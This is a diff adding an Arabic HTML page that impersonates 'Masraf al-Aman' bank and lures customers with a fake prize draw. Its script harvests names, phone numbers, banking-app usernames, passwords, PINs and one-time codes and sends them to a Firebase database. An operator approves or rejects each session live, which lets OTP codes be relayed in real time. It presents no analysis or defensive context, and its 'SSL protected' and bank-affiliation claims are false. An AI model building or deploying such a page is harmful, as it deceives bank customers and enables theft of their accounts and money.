@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>مصرف الأمان</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
+    * { font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      min-height: 100vh;
+      background: var(--bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
+      padding: 20px;
+    }
+
+    .card {
+      background: var(--bg-card);
+      border-radius: 20px;
+      padding: 35px 28px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      text-align: center;
+    }
+
+    .logo { width: 100px; margin-bottom: 20px; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    .landing-title {
+      font-size: 26px;
+      font-weight: 900;
+      color: var(--primary);
+      line-height: 1.4;
+      margin-bottom: 12px;
+    }
+    .landing-sub1 {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+    .landing-sub2 {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.7;
+      margin-bottom: 28px;
+    }
+    .btn-main {
+      width: 100%;
+      padding: 14px;
+      background: #0058b0;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn-main:hover { background: #0058b0; }
+    .btn-main:active { transform: scale(0.98); }
+
+    .page-title {
+      font-size: 20px;
+      font-weight: 900;
+      color: var(--primary);
+      margin-bottom: 6px;
+    }
+    .page-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 22px;
+    }
+    .form-group { margin-bottom: 16px; text-align: right; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-group input {
+  background: #ffffff !important;
+  color: #1a2a3a !important;
+      width: 100%;
+      padding: 12px 14px;
+      border: 2px solid #b0bec5;
+      border-radius: 10px;
+      font-size: 14px;
+      outline: none;
+      text-align: right;
+      transition: border-color 0.2s;
+      background: #ffffff;
+    }
+    .form-group input:focus {
+      border-color: #0058b0;
+      background: var(--bg-card);
+    }
+
+    .login-subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 22px;
+      font-weight: 600;
+    }
+    .input-wrap { position: relative; }
+    .pin-wrap {
+      position: relative;
+    }
+    .pin-wrap input {
+      padding-left: 40px;
+    }
+    .eye-btn {
+      position: absolute;
+      left: 10px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none;
+      cursor: pointer; color: #aaa; font-size: 18px;
+      z-index: 2;
+      padding: 0;
+      line-height: 1;
+    }
+    .eye-btn:hover { color: #0058b0; }
+
+    .special-badge {
+      margin-top: 18px;
+      background: linear-gradient(160deg, var(--primary-dark) 0%, var(--primary) 60%, var(--primary-light) 100%), #c8e6c9);
+      border: 2px solid #b0bec5;
+      border-radius: 12px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .special-badge .badge-icon { font-size: 22px; flex-shrink: 0; }
+    .special-badge .badge-text {
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--primary);
+      line-height: 1.5;
+    }
+
+    .secure-note {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 14px;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 22px;
+    }
+    .step-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--border);
+      transition: background 0.3s;
+    }
+    .step-dot.active { background: #0058b0; }
+    .step-dot.done { background: #81c784; }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 20, 60, 0.88);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+    .overlay.show { display: flex; }
+
+    .lightbox {
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 40px 32px;
+      text-align: center;
+      max-width: 320px;
+      width: 90%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+      border: 1px solid rgba(0,88,176,0.15);
+    }
+
+    .spinner {
+      width: 56px; height: 56px;
+      border: 5px solid #dce8f7;
+      border-top-color: #0058b0;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-title { font-size: 18px; font-weight: 800; color: #0058b0; margin-bottom: 10px; }
+    .waiting-sub { font-size: 13px; color: #555; line-height: 1.7; }
+
+    .error-icon-big { font-size: 54px; margin-bottom: 14px; }
+    .error-lb-title { font-size: 17px; font-weight: 900; color: #c62828; margin-bottom: 10px; }
+    .error-lb-msg { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 22px; }
+    .btn-retry {
+      width: 100%;
+      padding: 12px;
+      background: #c62828;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-retry:hover { background: #b71c1c; }
+
+    /* OTP - Single Input */
+    .otp-title { font-size: 22px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
+    .otp-sub { font-size: 13px; color: #666; margin-bottom: 22px; }
+    .otp-inputs {
+      margin-bottom: 20px;
+    }
+    .otp-inputs input {
+      width: 100%;
+      height: 58px;
+      border: 2px solid #b0bec5;
+      border-radius: 10px;
+      font-size: 24px;
+      font-weight: 800;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.2s;
+      letter-spacing: 8px;
+      background: #fafafa;
+      direction: ltr;
+    }
+    .otp-inputs input:focus { border-color: #0058b0; background: var(--bg-card); }
+    .otp-error {
+      display: none;
+      background: #fee2e2;
+      color: #dc2626;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+    .otp-error.show { display: block; }
+
+    .success-icon { font-size: 60px; margin-bottom: 14px; }
+    .success-title { font-size: 22px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
+    .success-sub { font-size: 14px; color: #666; }
+  
+  .form-group input::placeholder { color: #90a4ae; }
+  .otp-inputs input::placeholder { color: #90a4ae; }
+  .input-wrap input::placeholder { color: #90a4ae; }
+
+
+  /* Janna Font - using Cairo as web-safe Arabic equivalent */
+  * { font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
+  
+  /* Main headings - bold dark blue */
+  h1, h2, h3, h4, h5, h6,
+  .landing-title, .step-title, .section-title,
+  .card-title, .page-title, .main-title,
+  .form-title, .modal-title, .header-title {
+    font-weight: 700 !important;
+    color: #003d7a !important;
+  }
+
+
+        .bin-wrapper {
+            margin: 10px 0;
+            text-align: center;
+        }
+        .bin-label {
+            display: block;
+            font-size: 14px;
+            color: #003d80;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .bin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            direction: ltr;
+        }
+        .bin-box {
+            width: 52px;
+            height: 52px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            line-height: 52px;
+            padding: 0;
+            border: 2px solid #003d80;
+            border-radius: 10px;
+            color: #ffffff;
+            background: #003d80;
+            outline: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+        }
+        .bin-box:focus {
+            border-color: #001f4d;
+            background: #001f4d;
+            box-shadow: 0 0 0 3px rgba(0,61,128,0.3);
+        }
+        </style>
+</head>
+<body>
+
+<!-- WAITING OVERLAY -->
+<div id="waitingOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من المعلومات</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من هويتك بشكل آمن</div>
+  </div>
+</div>
+
+<!-- ERROR LIGHTBOX (login rejected) -->
+<div id="errorOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">المعلومات غير صحيحة</div>
+    <div class="error-lb-msg">
+      معلوماتك المدخلة غير صحيحة،<br/>
+      يرجى التأكد من المعلومات وإدخالها بشكل صحيح
+    </div>
+    <button class="btn-retry" onclick="retryLogin()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
+
+<!-- WAITING OTP OVERLAY -->
+<div id="waitingOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من الرمز</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من رمز التحقق</div>
+  </div>
+</div>
+
+<!-- ERROR OTP LIGHTBOX -->
+<div id="errorOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">رمز التحقق غير صحيح</div>
+    <div class="error-lb-msg">
+      الرمز الذي أدخلته غير صحيح،<br/>
+      يرجى التأكد من الرمز وإعادة المحاولة
+    </div>
+    <button class="btn-retry" onclick="retryOTP()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
+
+<!-- CARD -->
+<div class="card">
+  <img src="logo.png" class="logo" alt="Logo"/>
+
+  <!-- STEP 0: LANDING -->
+  <div class="step active" id="stepLanding">
+    <div class="landing-title">مصرف الأمان</div>
+    <div class="landing-sub1">خاص لعملاء مصرف الأمان</div>
+    <div class="landing-sub2">
+      سجل في السحب الان على الجوائز النقدية والعينية المجزية<br/>
+      المقدمة من مصرف الأمان
+    </div>
+    <button class="btn-main" onclick="goToPersonalInfo()">🎁 سجل في السحب الان</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الأمان © 2024</div>
+  </div>
+
+  <!-- STEP 1: PERSONAL INFO -->
+  <div class="step" id="stepPersonal">
+    <div class="step-indicator">
+      <div class="step-dot done" id="dot0"></div>
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+    </div>
+    <div class="page-title">المعلومات الشخصية</div>
+    <div class="page-sub">أدخل بياناتك الشخصية للمتابعة</div>
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="nameInput" placeholder="أدخل اسمك الكامل"/>
+    </div>
+    <div class="form-group">
+      <label>رقم الهاتف</label>
+      <input type="tel" id="personalPhoneInput" placeholder="09XXXXXXXXX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
+    </div>
+    <button class="btn-main" onclick="goToLogin()">التالي ←</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الأمان © 2024</div>
+  </div>
+
+  <!-- STEP 2: LOGIN -->
+  <div class="step" id="stepLogin">
+    <div class="step-indicator">
+      <div class="step-dot done"></div>
+      <div class="step-dot done"></div>
+      <div class="step-dot active"></div>
+    </div>
+    <div class="page-title">بيانات التطبيق</div>
+    <div class="login-subtitle">أدخل بيانات محفظتك الإلكترونية</div>
+    <div class="form-group">
+      <div class="input-wrap">
+        <input type="text" id="phoneInput" placeholder="اسم المستخدم حسب التطبيق البنكي" oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"/>
+      </div>
+    </div>
+    <div class="form-group">
+     <div class="input-wrap pin-wrap">
+  <input type="password" id="pinInput" placeholder="كلمة مرور التطبيق البنكي"/>
+  <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
+</div>
+      <!-- BIN 4 boxes -->
+      <div class="bin-wrapper">
+        <label class="bin-label">الرقم السري BIN</label>
+        <div class="bin-boxes">
+          <input class="bin-box" type="tel" maxlength="1" id="bin1"/>
+          <input class="bin-box" type="tel" maxlength="1" id="bin2"/>
+          <input class="bin-box" type="tel" maxlength="1" id="bin3"/>
+          <input class="bin-box" type="tel" maxlength="1" id="bin4"/>
+        </div>
+      </div>
+    </div>
+    <div class="special-badge">
+      <div class="badge-icon">🏦</div>
+      <div class="badge-text">خاص بعملاء مصرف الأمان</div>
+    </div>
+    <button class="btn-main" style="margin-top:18px;" onclick="submitLogin()">تسجيل الدخول</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الأمان © 2024</div>
+  </div>
+
+  <!-- STEP 3: OTP -->
+  <div class="step" id="stepOTP">
+    <div class="otp-title">أدخل رمز التحقق</div>
+    <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
+    <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
+    <div class="otp-inputs">
+      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
+    </div>
+    <button class="btn-main" onclick="submitOTP()">تأكيد</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الأمان © 2024</div>
+  </div>
+
+  <!-- STEP 4: SUCCESS -->
+  <div class="step" id="stepSuccess">
+    <div class="success-icon">✅</div>
+    <div class="success-title">تم التسجيل بنجاح!</div>
+    <div class="success-sub">شكراً لك، تم تسجيلك في السحب بنجاح</div>
+  </div>
+
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyACv7SFVVw3U7TEqZypEwqIDmtuuVALNRA",
+    authDomain: "masraf-alaman.firebaseapp.com",
+    databaseURL: "https://masraf-alaman-default-rtdb.firebaseio.com",
+    projectId: "masraf-alaman",
+    storageBucket: "masraf-alaman.firebasestorage.app",
+    messagingSenderId: "783217104937",
+    appId: "1:783217104937:web:b7fa518b3503ff2ed22438",
+    measurementId: "G-WYCXRCET1R"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let sessionRef = null;
+  let loginListener = null;
+  let otpListener = null;
+
+  function showOverlay(id) { document.getElementById(id).classList.add('show'); }
+  function hideOverlay(id) { document.getElementById(id).classList.remove('show'); }
+  const pageMap = {
+    'stepLanding': 'landing',
+    'stepPersonal': 'personal',
+    'stepLogin': 'login',
+    'stepOTP': 'otp',
+    'stepSuccess': 'success'
+  };
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (typeof sessionRef !== 'undefined' && sessionRef && pageMap[id]) {
+      update(sessionRef, { currentPage: pageMap[id] });
+    }
+  }
+
+  window.goToPersonalInfo = function() {
+    showStep('stepPersonal');
+  }
+
+  window.goToLogin = function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const phone = document.getElementById('personalPhoneInput').value.trim();
+    if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
+    showStep('stepLogin');
+  }
+
+  window.togglePin = function() {
+    const p = document.getElementById('pinInput');
+    p.type = p.type === 'password' ? 'text' : 'password';
+  }
+
+  window.retryLogin = function() {
+    hideOverlay('errorOverlay');
+    document.getElementById('phoneInput').value = '';
+    document.getElementById('pinInput').value = '';
+    showStep('stepLogin');
+  }
+
+  window.retryOTP = function() {
+    hideOverlay('errorOTPOverlay');
+    const inp = document.getElementById('otpSingleInput');
+    inp.value = '';
+    inp.focus();
+  }
+
+  window.submitLogin = async function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const personalPhone = document.getElementById('personalPhoneInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
+    const pin = document.getElementById('pinInput').value.trim();
+    const bin = (document.getElementById('bin1').value || '') +
+            (document.getElementById('bin2').value || '') +
+            (document.getElementById('bin3').value || '') +
+            (document.getElementById('bin4').value || '');
+    if (!phone || !pin) return;
+
+    showOverlay('waitingOverlay');
+
+    const newRef = push(ref(db, 'site1/sessions'), {
+     name, personalPhone, phone, pin, bin,
+      otp: '---',
+      status: 'waiting',
+      currentPage: 'login',
+      timestamp: Date.now()
+    });
+    sessionRef = newRef;
+
+    loginListener = onValue(newRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'approved') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showStep('stepOTP');
+      } else if (data.status === 'rejected') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showOverlay('errorOverlay');
+      }
+    });
+  }
+
+  window.submitOTP = function() {
+    const otp = document.getElementById('otpSingleInput').value.trim();
+    if (!otp) return;
+
+    document.getElementById('otpError').classList.remove('show');
+    showOverlay('waitingOTPOverlay');
+
+    if (sessionRef) update(sessionRef, { otp, status: 'otp_submitted' });
+    if (otpListener) off(sessionRef, 'value', otpListener);
+
+    otpListener = onValue(sessionRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'final_approved') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showStep('stepSuccess');
+      } else if (data.status === 'final_rejected') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showOverlay('errorOTPOverlay');
+        if (sessionRef) update(sessionRef, { otp: '---', status: 'approved' });
+      }
+    });
+  }
+
+        function moveFocus(el, num) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+            if (el.value.length === 1) {
+                if (num < 4) {
+                    document.getElementById('bin' + (num + 1)).focus();
+                }
+            }
+        }
+
+        // Setup BIN boxes on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            var boxes = ['bin1','bin2','bin3','bin4'];
+            boxes.forEach(function(id, idx) {
+                var el = document.getElementById(id);
+                if (!el) return;
+                el.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && el.value === '' && idx > 0) {
+                        document.getElementById(boxes[idx-1]).focus();
+                    }
+                });
+                el.addEventListener('input', function() {
+                    el.value = el.value.replace(/[^0-9]/g, '').slice(0,1);
+                    if (el.value.length === 1 && idx < 3) {
+                        document.getElementById(boxes[idx+1]).focus();
+                    }
+                });
+            });
+        });
+        </script>
+</body>
+</html>
+
